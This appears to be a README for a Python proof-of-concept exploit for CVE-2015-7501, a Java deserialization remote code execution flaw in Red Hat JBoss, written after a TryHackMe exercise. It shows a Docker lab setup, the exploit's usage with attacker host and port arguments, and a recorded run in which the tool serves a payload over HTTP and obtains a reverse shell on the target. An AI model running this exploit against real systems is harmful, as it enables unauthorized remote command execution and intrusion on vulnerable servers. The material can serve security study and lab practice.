# CVE-2015-7501 - jboss6_deser_rce

Red Hat JBoss A-MQ 6.x; BPM Suite (BPMS) 6.x; BRMS 6.x and 5.x; Data Grid (JDG) 6.x; Data Virtualization (JDV) 6.x and 5.x; Enterprise Application Platform 6.x, 5.x, and 4.3.x; Fuse 6.x; Fuse Service Works (FSW) 6.x; Operations Network (JBoss ON) 3.x; Portal 6.x; SOA Platform (SOA-P) 5.x; Web Server (JWS) 3.x; Red Hat OpenShift/xPAAS 3.x; and Red Hat Subscription Asset Manager 1.3 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

## Summary 

Was a serialization excersice on tryhackme, got some feeling and rewrote this poc a bit. 
My initial plan was to remove the ysoserial dependency and will probably look into do that later.
Here is the results from my quick hack.

## Usage

Start docker container with Jboss from docker/jboss folder if you want to test this locally.
jdk will be download as it is required but as we did not want to store it in repository.

```ssh
⬢  jboss  master ⦿ ./start.sh 
--2020-04-25 20:29:49--  https://mirrors.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64-rpm.bin
Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
Resolving mirrors.huaweicloud.com (mirrors.huaweicloud.com)... 117.78.24.34, 117.78.24.32, 117.78.24.36
Connecting to mirrors.huaweicloud.com (mirrors.huaweicloud.com)|117.78.24.34|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68881069 (66M) [application/octet-stream]
Saving to: ‘jdk-6u45-linux-x64-rpm.bin’
                                                              
jdk-6u45-linux-x64-rpm.bin                                     100%[=================================================================================================================================================>]  65.69M  10.3MB/s    in 8.0s    
                                                              
2020-04-25 20:30:00 (8.23 MB/s) - ‘jdk-6u45-linux-x64-rpm.bin’ saved [68881069/68881069]                                                                                                                                                                 
                                                                                                                                                                                                                                                         
Sending build context to Docker daemon  68.93MB
Step 1/14 : FROM jboss/base:latest
 ---> 8b62c4311c29
Step 2/14 : MAINTAINER Olivier Vanekem <olivier.vanekem@gmail.com>
 ---> Using cache
 ---> 860c8f3c5076
Step 3/14 : USER root
 ---> Using cache

....

```

Verify that container is running.

```ssh
⬢  jboss  master ⦿ docker ps
CONTAINER ID        IMAGE                                      COMMAND                  CREATED              STATUS              PORTS                    NAMES
b7016de33fdb        ovanekem/docker-jboss-6.0.0.final:latest   "/opt/jboss/jboss-6.…"   About a minute ago   Up About a minute   0.0.0.0:8090->8080/tcp   zealous_kalam
```

Execute without commands for usage menu.

```sh
⬢  CVE-2015-7501_Jboss6_deser_rce  master ⦿ ./jboss6_deser_rce.py                                           

 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./jboss6_deser_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./jboss6_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337
``` 

And run the exploit 

```sh
⬢  CVE-2015-7501_jboss6_deser_rce  master ⦿ ./jboss6_deser_rce.py http://127.0.0.1:8080 192.168.1.75 9004
/usr/lib/python2.7/site-packages/requests/__init__.py:80: RequestsDependencyWarning: urllib3 (1.25.9) or chardet (3.0.4) doesn't match a supported version!
  RequestsDependencyWarning)
[+] LHOST = 192.168.1.75
[+] Prepare payload
[+] Shell listen
[+] HTTP Listen = 8000
172.17.0.2 - - [25/Apr/2020 20:37:08] "GET /8 HTTP/1.1" 200 -
[+] Exploit
[+] Exploit
[jboss@f5c8959b7b82 ~]$ id
uid=1000(jboss) gid=1000(jboss) groups=1000(jboss)
```